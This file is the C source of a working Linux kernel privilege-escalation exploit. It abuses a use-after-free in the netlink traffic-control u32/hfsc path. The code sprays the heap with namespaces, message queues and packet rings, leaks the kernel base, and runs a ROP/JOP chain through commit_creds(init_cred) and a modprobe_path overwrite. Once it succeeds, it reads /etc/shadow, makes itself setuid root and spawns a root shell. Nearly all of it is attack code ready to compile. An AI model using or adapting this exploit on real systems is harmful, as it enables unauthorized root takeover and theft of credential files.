#define _GNU_SOURCE

#include <time.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <assert.h>
#include <stdarg.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/pkt_sched.h>
#include <linux/nsfs.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <netinet/ip.h>
// #include "libexp.h"

#define SPRAY_NUM1 10
#define SPRAY_NUM2 10
#define SPRAY_NUM3 0x30
#define u64 unsigned long long
#define u32 unsigned int
#define unlikely(x)	__builtin_expect(!!(x), 0)

u64 kernel_base = 0;
u64 slide = 0;
u64 kfree_ptr = 0xffffffff822a8858; // ext4_feat_ktype
int *success, *crash;
pid_t pids1[SPRAY_NUM1];
pid_t pids2[SPRAY_NUM2];
pid_t pids3[SPRAY_NUM3];
char path[0x800];

struct msg_spray_t {
	struct msg_spray_t *next;
	int msgqid;
	void *payload;
	size_t len;
	u32 num;
};

void shell(void)
{
	printf("uid: %d\n", getuid());
	system("/bin/bash");
}

pid_t clean_fork(void)
{
	pid_t pid = fork();
	if(pid) return pid;

	assert(prctl(PR_SET_PDEATHSIG, SIGKILL) >= 0);
	return pid;
}

void set_cpu(int cpuid)
{
	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(cpuid, &my_set);
	assert(sched_setaffinity(0, sizeof(my_set), &my_set) == 0);
}

int write_file(const char* fname, const char* fmt, ...) 
{
	char buf[1024];
	va_list args;

	va_start(args, fmt);
	vsnprintf(buf, sizeof(buf)-1, fmt, args);
	va_end(args);
	buf[sizeof(buf)-1] = 0; 

	int len = strlen(buf);
	int fd = open(fname, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return -1;
	if (write(fd, buf, len) != len) {
		close(fd);
		return -1;
	}	
	close(fd);
	return 0;
}

void setup_sandbox(void)
{
	int real_uid = getuid();
	int real_gid = getgid();

	assert(unshare(CLONE_NEWUSER | CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWPID) == 0);
	assert(write_file("/proc/self/setgroups", "deny") >= 0);
	assert(write_file("/proc/self/uid_map", "0 %d 1\n", real_uid) >= 0);
	assert(write_file("/proc/self/gid_map", "0 %d 1\n", real_gid) >= 0);
}

void *build_pkt(struct nlmsghdr *hdr, struct tcmsg *tcmsg, void *attrs, int attr_len)
{
	// netlink packet, from /usr/include/linux/netlink.h
	/*
	 *  <------- NLA_HDRLEN ------> <-- NLA_ALIGN(payload)-->
	 * +---------------------+- - -+- - - - - - - - - -+- - -+
	 * |		Header	   | Pad |	 Payload	   | Pad |
	 * |   (struct nlattr)   | ing |				   | ing |
	 * +---------------------+- - -+- - - - - - - - - -+- - -+
	 *  <-------------- nlattr->nla_len -------------->
	 */

	// struct nlattr {
	// 	__u16		   nla_len;
	// 	__u16		   nla_type;
	// };

	// traffic control policy
	// const struct nla_policy rtm_tca_policy[TCA_MAX + 1] = {
	// 	[TCA_KIND]		= { .type = NLA_STRING },
	// 	[TCA_RATE]		= { .type = NLA_BINARY,
	// 					.len = sizeof(struct tc_estimator) },
	// 	[TCA_STAB]		= { .type = NLA_NESTED },
	// 	[TCA_DUMP_INVISIBLE]	= { .type = NLA_FLAG },
	// 	[TCA_CHAIN]		= { .type = NLA_U32 },
	// 	[TCA_INGRESS_BLOCK]	= { .type = NLA_U32 },
	// 	[TCA_EGRESS_BLOCK]	= { .type = NLA_U32 },
	// };
	//
	// struct tcmsg {
	// 	unsigned char	tcm_family;
	// 	unsigned char	tcm__pad1;
	// 	unsigned short	tcm__pad2;
	// 	int				tcm_ifindex;
	// 	__u32			tcm_handle;
	// 	__u32			tcm_parent;
	// 	__u32			tcm_info;
	// };
	//
	// struct nlmsghdr {
	//	 __u32 nlmsg_len;// = 0x38;
	//	 __u16 nlmsg_type;// = 0x24??? RTM_NEWQDISC, creating a new qdisc scheduler
	//	 __u16 nlmsg_flags;// = 0x401 NLM_F_REQUEST(0x1)|NLM_F_CREATE(0x400)
	//	 __u32 nlmsg_seq;// = NL_AUTO_SEQ
	//	 __u32 nlmsg_pid;// = NL_AUTO_PID
	// };
	//
	//
	//enum {
	//	TCA_U32_UNSPEC,
	//	TCA_U32_CLASSID,
	//	TCA_U32_HASH,
	//	TCA_U32_LINK,
	//	TCA_U32_DIVISOR,
	//	TCA_U32_SEL,
	//	TCA_U32_POLICE,
	//	TCA_U32_ACT,
	//	TCA_U32_INDEV,
	//	TCA_U32_PCNT,
	//	TCA_U32_MARK,
	//	TCA_U32_FLAGS,
	//	TCA_U32_PAD,
	//	__TCA_U32_MAX
	//};
	// struct nla_policy u32_policy[TCA_U32_MAX + 1] = {
	//	[TCA_U32_CLASSID]	= { .type = NLA_U32 },
	//	[TCA_U32_HASH]		= { .type = NLA_U32 },
	//	[TCA_U32_LINK]		= { .type = NLA_U32 },
	//	[TCA_U32_DIVISOR]	= { .type = NLA_U32 },
	//	[TCA_U32_SEL]		= { .len = sizeof(struct tc_u32_sel) },
	//	[TCA_U32_INDEV]		= { .type = NLA_STRING, .len = IFNAMSIZ },
	//	[TCA_U32_MARK]		= { .len = sizeof(struct tc_u32_mark) },
	//	[TCA_U32_FLAGS]		= { .type = NLA_U32 },
	//};

	void *payload = calloc(1, 0x1000);
	void *ptr = payload;
	hdr->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct tcmsg) + attr_len;
	// printf("nlmsg_len: %#x\n", hdr->nlmsg_len);
	// printf("attr_len: %#x\n", attr_len);

	memcpy(ptr, hdr, sizeof(struct nlmsghdr));
	ptr += sizeof(struct nlmsghdr);
	memcpy(ptr, tcmsg, sizeof(struct tcmsg));
	ptr += sizeof(struct tcmsg);
	memcpy(ptr, attrs, attr_len);
	return payload;
}

void net_spray1()
{
	for(int i=0; i<SPRAY_NUM1; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids1[i] = pid;
	}
	usleep(500000);
}

void net_spray2()
{
	for(int i=0; i<SPRAY_NUM2; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids2[i] = pid;
	}
	usleep(500000);
}

void net_spray3()
{
	for(int i=0; i<SPRAY_NUM3; i++) {
		pid_t pid = clean_fork();
		assert(pid != -1);
		if(!pid) {
			if (unshare(CLONE_NEWNET | CLONE_NEWNS | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
		pids3[i] = pid;
	}
	usleep(500000);
}
void net_defragment(int num)
{
	for(int i=0; i<num; i++) {
		if(!clean_fork()) {
			if (unshare(CLONE_NEWNS | CLONE_NEWNET | CLONE_NEWUSER) != 0) {
				perror("unshare");
			}
			sleep(100000);
		}
	}
	usleep(500000);
	// sleep(1);
}

void net_release1()
{
	for(int i=0; i<SPRAY_NUM1; i++) {
		int ret = kill(pids1[i], SIGKILL);
		assert(ret == 0);
	}
}

void net_release2()
{
	for(int i=0; i<SPRAY_NUM2; i++) {
		int ret = kill(pids2[i], SIGKILL);
		assert(ret == 0);
	}
}

void net_release3(int full)
{
	int jump;
	if(full) jump = 1;
	else jump = 2;
	// we don't free all struct net so we don't discard slab
	for(int i=0; i<SPRAY_NUM3; i+=jump) {
		int ret = kill(pids3[i], SIGKILL);
		if(!full) assert(ret == 0);
	}
}

struct msg_spray_t *msg_spray_once(void *payload, size_t msg_size, u32 num)
{
	int msgqid;
	char *buf;

	// create the message queue id first
	msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid >= 0);

	// do spray
	int ret;
	for(int i=0; i<num; i++) {
		ret = msgsnd(msgqid, payload, msg_size, IPC_NOWAIT);
		assert(ret >= 0);
	}

	// return info about this spray
	struct msg_spray_t *spray = malloc(sizeof(struct msg_spray_t));
	spray->next = NULL;
	spray->msgqid = msgqid;
	spray->payload = payload;
	spray->len = msg_size;
	spray->num = num;
	return spray;
}

struct msg_spray_t *msg_spray(void *payload, size_t msg_size, u32 num)
{
	u32 sent = 0;
	struct msg_spray_t *spray = NULL, *tmp_spray;

	// send messege one at a time
	while(num > 0) {
		u32 todo = 1;
		tmp_spray = msg_spray_once(payload, msg_size, todo);
		sent += todo;
		num -= todo;

		// link tmp_spray
		if(!spray) spray = tmp_spray;
		else {
			tmp_spray->next = spray->next;
			spray->next = tmp_spray;
		}
	}
	return spray;
}

int get_inum()
{
	int i;
	char buf[0x200];
	memset(buf, 0, sizeof(buf));

	// reference: function ns_get_name
	ssize_t ret = readlink("/proc/self/ns/net", buf, sizeof(buf));
	assert(ret >= 0);
	for(i=0; i<ret; i++) {
		if(buf[i] == '[') break;
	}
	assert(buf[i] == '[');

	return atoi(&buf[i+1]);
}

int identify_msg(struct msg_spray_t *spray)
{
	int ret;
	int inum;
	void *payload = malloc(spray->len+0x10);
	void *buffer = malloc(spray->len+0x10);
	struct msg_spray_t *new_spray;
	int *ptr = (int *)(payload+8);

	// taint payload
	memset(payload, 'A', 8);
	for(int i=0; i<(spray->len-8)/sizeof(*ptr); i++) {
		ptr[i] = i+8; // so ptr[i] != 4
	}

	while(spray) {
		// free the message
		ret = msgrcv(spray->msgqid, buffer, spray->len, 0, MSG_NOERROR | IPC_NOWAIT);
		// printf("ret: %d\n", ret);
		assert(ret >= 0);

		// occupy the slot
		new_spray = msg_spray_once(payload, spray->len, 1);
		inum = get_inum();
		// printf("inum: %#x\n", inum);
		if(inum != 4) break;

		spray = spray->next;
	}
	assert(spray != NULL);
	return new_spray->msgqid;
}

void *prepare_payload(char *payload)
{
	// pivot stack without clobbering rbp
	*(long *)&payload[0x20] = slide + 0xffffffff81c0917c; // : push rdi ; jo 0xffffffff81c09139 ; jmp qword ptr [rax + 0x51]
	*(long *)&payload[0x51] = slide + 0xffffffff81c0548e; // : pop rsp ; call qword ptr [rax - 0x72]
	*(long *)&payload[-0x72] = slide + 0xffffffff810566a9; // : pop rdi ; pop rsi ; pop rdx ; pop rcx ; ret

}

void error_out(const char *fmt, ...)
{
	char *buf;
	va_list ap;

	va_start(ap, fmt);
	if(vasprintf(&buf, fmt, ap) < 0) {
		perror("[error_out]");
		exit(-1);
	}
	va_end(ap);

	puts(buf);
	perror("[Reason] ");
	exit(-1);
}

int *stage;
int pg_vec_spray(void *src_buf, u32 buf_size, u32 num)
{
	if((buf_size & 0xfff) != 0) error_out("[pg_vec_spray] buf_size");

	// remember to run everything in sandbox
	int s = socket(AF_PACKET, SOCK_RAW|SOCK_CLOEXEC, htons(ETH_P_ALL));
	if(s < 0) error_out("[pg_vec_spray] socket");

	struct tpacket_req req;
	req.tp_block_size = buf_size;
	req.tp_block_nr = num;// spray times
	req.tp_frame_size = buf_size;
	req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;
	int ret = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if(ret < 0) error_out("[pg_vec_spray] setsockopt");

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ARP);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;
	void *addr = mmap(NULL, buf_size, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_POPULATE, -1, 0);
	memcpy(addr, src_buf, buf_size);
	for(int i=0; i<num; i++) {
		// printf("spray: %d\n", i);
		ret = sendto(s, addr, buf_size, 0, (struct sockaddr *)&sa, sizeof(sa));
		if(ret < 0) error_out("[pg_vec_spray] sendto");
	}
	return s;
}

void setup_pg_vec()
{
	// bring up lo interface
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	struct ifreq req;
	memset(&req, 0, sizeof(req));
	strcpy(req.ifr_name, "lo");
	req.ifr_flags = IFF_UP|IFF_LOOPBACK|IFF_RUNNING;
	int ret = ioctl(fd, SIOCSIFFLAGS, &req);
	if(ret != 0) error_out("[setup_pg_vec] ioctl");
	close(fd);

}

void hex_print(void *addr, size_t len)
{
	u64 tmp_addr = (u64)addr;
	puts("");
	for(u64 tmp_addr=(u64)addr; tmp_addr < (u64)addr + len; tmp_addr += 0x10) {
		printf("0x%016llx: 0x%016llx 0x%016llx\n", tmp_addr, *(u64 *)tmp_addr, *(u64 *)(tmp_addr+8));
	}
}

void do_spray_func()
{
	setup_sandbox();
	setup_pg_vec(); // bring up lo after creating a new net namespace
	// setup payload
	void *src_page = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
	for(int i=0; i<7; i++) {
		u64 *ns = src_page+0x11c0*i+0xc0-0x42;
		for(int j=0; j<0x11c0/8; j++) {
			ns[j] = 0xfffffe0000000004;
		}
		ns[1] = 0xfffffe0000000004; // set ops
		ns[2] = 4; // set inum
	}

	// spray
	puts("[*] do_spray_func waiting...");
	while(*stage == 0) usleep(100000);
	puts("[*] do spray!!!!");
	int s = pg_vec_spray(src_page, 0x8000, 0x100);
	void *ubuf = mmap(NULL, 0x8000*0x100, PROT_READ | PROT_WRITE, MAP_SHARED, s, 0);
	printf("ubuf: %p\n", ubuf);
	assert(ubuf != -1);
	puts("[*] spray done!");

	// set ops
	while(*stage == 1) usleep(100000);
	puts("[*] set ops!");
	for(int j=0; j<0x100; j++) {
		for(int i=0; i<7; i++) {
			// printf("%d %d\n", i, j);
			u64 *ns = ubuf+0x8000*j+0x11c0*i+0xc0;
			ns[1] = 0xfffffe0000002fa0 - 0x20; // set ops
			u64 *ptr = ubuf+0x8000*j+0x11c0*i+0xc0-0x33;
			*ptr = 0xfffffe0000002fa0; // part of the JOP chain
		}
	}

	sleep(10000);
}

void prepare_ropchain(u64 *rop, u64 buffer)
{
	int idx = 0;

	// save rbp+0x140 to buffer
	rop[idx++] = slide + 0xffffffff816fa405; // enter 0,0; pop rbx; pop r14; pop rbp; ret
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = slide + 0xffffffff8102c2c1;// : pop rax ; ret
	rop[idx++] = 0x140;
	rop[idx++] = slide + 0xffffffff81205e83; // : add rbx, rax ; mov rax, rbx ; pop rbx ; pop r14 ; pop rbp ; ret
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = buffer-0x108;
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = slide + 0xffffffff81166890; // : mov qword ptr [r14 + 0x108], rax ; xor eax, eax ; pop rbx ; pop r14 ; pop rbp ; ret
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = 0xdeadbeef;
	rop[idx++] = 0xdeadbeef;

	// escalate privilege
	rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
	rop[idx++] = slide + 0xffffffff82250950; // init_cred
	rop[idx++] = slide + 0xffffffff8109ed70; // commit_creds

	// switch namespace for itself (to get rid of the broken net namespace)
	rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
	rop[idx++] = getpid();
	rop[idx++] = slide + 0xffffffff810963e0; // find_task_by_vpid
	rop[idx++] = slide + 0xffffffff8108d212; // : pop rdx ; ret
	rop[idx++] = 1;
	rop[idx++] = slide + 0xffffffff8154e861; // cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret;
	rop[idx++] = 0; // padding
	rop[idx++] = slide + 0xffffffff8123cb26; // mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret;
	rop[idx++] = 0; // padding
	rop[idx++] = slide + 0xffffffff8105d30f; // : pop rsi ; ret;
	rop[idx++] = slide + 0xffffffff82250580; // init_nsproxy
	rop[idx++] = slide + 0xffffffff8109d1a0; // switch_task_namespaces

	// switch namespace for pid 1
	rop[idx++] = slide + 0xffffffff81067a60; // : pop rdi ; ret
	rop[idx++] = 1;
	rop[idx++] = slide + 0xffffffff810963e0; // find_task_by_vpid
	rop[idx++] = slide + 0xffffffff8108d212; // : pop rdx ; ret
	rop[idx++] = 1;
	rop[idx++] = slide + 0xffffffff8154e861; // cmp rdx, 1 ; jne 0xffffffff8154e89d ; pop rbp ; ret;
	rop[idx++] = 0; // padding
	rop[idx++] = slide + 0xffffffff8123cb26; // mov rdi, rax ; jne 0xffffffff8123cb16 ; pop rbp ; ret;
	rop[idx++] = 0; // padding
	rop[idx++] = slide + 0xffffffff8105d30f; // : pop rsi ; ret;
	rop[idx++] = slide + 0xffffffff82250580; // init_nsproxy
	rop[idx++] = slide + 0xffffffff8109d1a0; // switch_task_namespaces

	// return execution
	rop[idx++] = slide + 0xffffffff81000571; // : pop rbp ; ret
	rop[idx++] = buffer + 0x10;
	rop[idx++] = slide + 0xffffffff8123e2cd; // : push qword ptr [rbp - 0x10] ; pop rbp ; ret
	rop[idx++] = slide + 0xffffffff810679cc; // : mov rsp, rbp ; pop rbp ; ret
}


u64 payload1[0x200/8];
u64 *rop1 = payload1;
void exploit(void)
{
	puts("Stage 2: trigger vulnerability");
	int ns_fd = open("/proc/self/ns/net", 0);
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
	printf("AF_NETLINK: %d\n",sk);
	// include uapi/linux/rtnetlink.h	
	// send the first nlmsg pkt to create qdisc
	// triggers rtnetlink_rcv_msg->tc_modify_qdisc // queue discipline
	//
	//
	// from net/sched/sch_api.c
   	// qdisc's are divided to two categories:
   	// - "queues", which have no internal structure visible from outside.
   	// - "schedulers", which split all the packets to "traffic classes",
   	//   using "packet classifiers" (look at cls_api.c)
   	// In turn, classes may have child qdiscs (as rule, queues)
   	// attached to them etc. etc. etc.
	// 
	// SO hfsc is a qdisc and u32 is a classifier
	//
	//
	//
	// send first packet to create a new qdisc
	struct nlmsghdr nlmsghdr = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWQDISC, // 0x24
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0,
							.tcm_parent = TC_H_ROOT, // 0xffffffff
							.tcm_info = 0};
	char attrs1[] =	"\x0c\x00""\x01\x00""hfsc\x00\x00\x00\x00"
					"\x08\x00""\x02\x00""\x00\x00\x00\x00";
	int attr_len1 = sizeof(attrs1) - 1; // minus the trailing null byte
	void *pkt = build_pkt(&nlmsghdr, &tcmsg, attrs1, attr_len1);

	send(sk, pkt, nlmsghdr.nlmsg_len, MSG_DONTWAIT);

	// send the second nlmsg pkt to successfully trigger tc_new_tfilter
	struct nlmsghdr nlmsghdr2 = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWTFILTER, // 0x2c
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg2 = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0,
							.tcm_parent = 0,
							.tcm_info = 1};
	char attrs2[] =	"\x08\x00""\x01\x00""u32\x00" // u32
					"\x18\x00""\x02\x00" // NESTED
						"\x14\x00""\x05\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";// TCA_U32_SEL
	int attr_len2 = sizeof(attrs2) - 1; // minus the trailing null byte
	void *pkt2 = build_pkt(&nlmsghdr2, &tcmsg2, attrs2, attr_len2);

	send(sk, pkt2, nlmsghdr2.nlmsg_len, MSG_DONTWAIT);

	// send the third nlmsg pkt to fail tc_new_tfilter
	//
	// u32 handler: xxx yy zzz
	// xxx: HTID, yy: HASH, zzz: NODE
	// yyzzz: KEY
	struct nlmsghdr nlmsghdr3 = {	.nlmsg_len = 0,
									.nlmsg_type = RTM_NEWTFILTER,
									.nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE,
									.nlmsg_seq = 0, // NL_AUTO_SEQ
									.nlmsg_pid = 0}; // NL_AUTO_PID
	struct tcmsg tcmsg3 = {	.tcm_family = PF_UNSPEC, // 0
							.tcm_ifindex = 1, // lo
							.tcm_handle = 0x80000800, // HTID: 0x800, HASH: 0, NODE: 0x800, KEY:0x00800
							.tcm_parent = 0,
							.tcm_info = 1};
	char attrs3[] =	"\x08\x00""\x01\x00""u32\x00" // u32
					"\x0c\x00""\x02\x00" // NESTED
						"\x08\x00""\x06\x00""\x00\x00\x00\x00";// TCA_U32_POLICE
	int attr_len3 = sizeof(attrs3) - 1; // minus the trailing null byte
	void *pkt3 = build_pkt(&nlmsghdr3, &tcmsg3, attrs3, attr_len3);

	// decrease struct net refcount to 1
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);

	// clear other objects in the same cache as our victim object
	// the target slab will be added to cpu_partial
	puts("Stage 3: reclaim object");
	net_release1();
	net_release2();
	sleep(2);

	// force the kernel to drain cpu_partial
	net_release3(0);

	// wait for everything to happen
	sleep(3);
	// puts("hey!");
	// getchar();

	// now decrease struct net refcount to 0 and wait for the object release and final discard_slab	
	send(sk, pkt3, nlmsghdr3.nlmsg_len, MSG_DONTWAIT);
	sleep(1);

	// try to reclaim the page!
	*stage = 1;
	sleep(2);
	int inum = get_inum();
	printf("inum: %#x\n", inum);
	assert(inum == 4);

	puts("Stage 4: leak info");
	// now we know we successfully reclaim the page, dereference it to get leak!
	long ret = ioctl(ns_fd, NS_GET_NSTYPE, 0);
	printf("leaked value: %#lx\n", ret);
	assert(ret != -1); // if struct net is aligned with msg_msg, the linked list will be corrupted because struct net thinks the heap pointer is a refcount and replaces it with REFCOUNT_SATURATE.
	kernel_base = ret - 0xa08e03;
	slide = kernel_base - 0xffffffff81000000ULL;
	kfree_ptr += slide;
	printf("kernel_base: %#llx\n", kernel_base);
	printf("kalsr_slide: %#llx\n", slide);
	assert((kernel_base & 0xfffff) == 0);

	// now overwrite ops to cpu_entry_area
	*stage = 2;
	sleep(1);
	int idx = 0;
	memset(payload1, 'B', 0x200);
	rop1[idx++] = 0x4141414141414141;
	rop1[0x200/8-4] = 0x4141414141414141;
	// getchar();
	*success = 0; // actually allocate the page first
	__asm__(".intel_syntax noprefix;"
		"mov rax, 0x4141414141414141;"
		"mov rcx, 0x4141414141414141;"
		"mov rdx, 0x4141414141414141;"
		"mov rdi, 0x4141414141414141;"
		"mov rsi, 0x4141414141414141;"
		"mov r11, 0x4141414141414141;"
		"mov r15, 0x4141414141414141;"
		"mov r14, 0x4141414141414141;"
		"mov r13, 0x4141414141414141;"
		"mov r12, 0x4141414141414141;"
		"mov r10, 0x4141414141414141;"
		"mov r8, 0x4141414141414141;"
		"mov r9, 0x4141414141414141;"
		"mov rbx, 0x4141414141414141;"
		"call rax;"
		"mov r8, 0xffffffff81c0b4bb;" // 0xfffffe0000002fa0 // : push qword ptr [rdi-0x33]; jmp qword ptr [rax];
		"add r8, slide;"
		"mov rbx, 0xffffffff81067a5e;" //: pop rsp; pop r15; ret;
		"add rbx, slide;"
		"mov rax, 0xffffffff810ca65b;" //: pop rsi; pop rdx; ret;
		"add rax, slide;"
		"mov rcx, 0xffffffff82251170;" //: modprobe_path
		"add rcx, slide;"
		"mov rdx, 0x6f6d2f706d742f2f;" 
		"mov rsi, 0xffffffff8191877b;" //: mov [rsi], rdx; pop rbp; ret;
		"add rsi, slide;"
		"mov rdi, 0xffffffff810a75b0;" // do_task_dead
		"add rdi, slide;"
		"xor r15, r15;"

		// put data onto cpu_entry_area
		"idiv r15d;"
		"nop;"
		"nop;"
		"nop;"
		".att_syntax;");
	//ioctl(ns_fd, NS_GET_NSTYPE, 0); // DEBUG
	*success = 1;
	close(ns_fd);

	while(1);
//0xffffffff81ff75c5: push rdi; jmp qword ptr [rax];
//0xffffffff8100056c: pop rsp; pop r14; pop r15; pop rbp; ret;



	//msgrcv(spray1->msgqid, buffer1, sizeof(buffer1), 0, MSG_NOERROR | IPC_NOWAIT);
	//fake_ns = (long *)&final_payload[offset-0x30+8];
	//fake_ns[0x0/8] = 0; // set net->ns->stashed == NULL
	//fake_ns[0x8/8] = fake_ops; // set net->ns->ops
	//fake_ns[0x10/8] = 0x42424242; // set net->ns->inum == 0x42424242
	// prepare_ropchain(&fake_ns[0x18/8], fake_ops+0x200);
	//struct msg_spray_t *spray_x = msg_spray(final_payload, 0xff8-0x30, 0x20);
	//assert(get_inum() == 0x42424242);

	//printf("uid: %d\n", getuid());
	//puts("Done!!!!");
	//// assert(unshare(CLONE_NEWNET) == 0);
	//ret = setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
	//assert(ret == 0);
	//// ret = setns(open("/proc/1/ns/net", O_RDONLY), 0);
	//// assert(ret == 0);
	//system("/bin/sh");
	//// ret = execve("/bin/bash", NULL, NULL);
	//// printf("execve ret: %d\n", ret);
	//getchar();
}

void handle_sig(int sig)
{
	printf("Caught signal %d\n", sig);
	puts("sleep!");
	net_release3(1);
	*crash = 1;
	sleep(10000);
}

void _sig_action(int sig, siginfo_t *info, void *ucontext)
{
	ucontext_t *ctx = (ucontext_t *)ucontext;
	// ctx->uc_mcontext.gregs[7] = 1;// restore r15 to 1 so the execution can continue
	ctx->uc_mcontext.gregs[0x10] += 3;// skip idiv
}

void __attribute__((constructor)) _setup_sigaction()
{
	// setup sigaction so that SIGFPE will be ignored
	struct sigaction act;
	memset(&act, 0, sizeof(act));
	act.sa_handler = NULL;
	act.sa_sigaction = _sig_action;
	act.sa_flags = SA_RESTART;
	sigaction(SIGFPE, &act, NULL);
}

void attempt(void)
{
	signal(SIGABRT, handle_sig);
	// signal(SIGSEGV, shell);
	set_cpu(0);

	stage = (int *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0);
	if(!clean_fork()) do_spray_func();

	puts("Stage 1: prepare heap layout");
	// first, defragment net_namespace
	net_defragment(0x40);
	// second, spray more struct net for later unfreezing
	net_spray3();
	// third, surround the target struct net with controlled struct net
	net_spray1();
	// finally, defragment struct net cache, get prepared for flushing
	setup_sandbox(); // I don't remember why setup_sandbox is here not before everything
	setup_pg_vec(); // bring up lo after creating a new net namespace
	net_spray2();
	net_defragment(0x10);

	exploit();
	puts("Execution ended!");
}

void check_root()
{
	// if we are root
	if(open("/etc/shadow", 0) >= 0) {
		setuid(0);
		system("head -n 10 /etc/shadow");
		system("/bin/bash");
		exit(0);
	}

	// or if we can be root
	int tmp_fd = open("/proc/sys/kernel/modprobe", 0);
	char buf[0x2000];
	memset(buf, 0, sizeof(buf));
	read(tmp_fd, buf, sizeof(buf));
	if(!strncmp(buf, "//tmp/modprobe", 14)) {
		sprintf(buf, "echo '#!/bin/bash\nchown root:root %s; chmod 04755 %s' > /tmp/modprobe; chmod +x /tmp/modprobe", path, path);
		system(buf);
		system("echo 1 > /tmp/1; chmod +x /tmp/1; /tmp/1 2> /dev/null");
		char *argv[] = {path, NULL};
		char *env[] = {NULL};
		execve(path, argv, env);
	}
}

int main(int argc, char **argv)
{
	// save absolute path for later use
    if(argc && argv[0] && argv[0][0]) assert(realpath(argv[0], path) != NULL);
	// in case we already are/can be root
	//check_root();

	crash = (int *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_ANON, -1, 0);
	success = crash + 1;
	*success = 0;
	while(*success == 0) {
		*crash = 0;
		if(!fork()) {
			puts("attempt!!");
			attempt();
		}
		while(*crash == 0 && *success == 0) {
			usleep(100000);
		}
		sleep(3);// give it some time to clean up memory
	}
	puts("Launch shell!");
	check_root();
	//char buffer[0x1000];
	//sprintf(buffer, "echo '#!/bin/bash\nchown root:root %s; chmod 04755 %s' > /tmp/modprobe; chmod +x /tmp/modprobe", path, path);
	//system(buffer);
	sleep(100000);
}

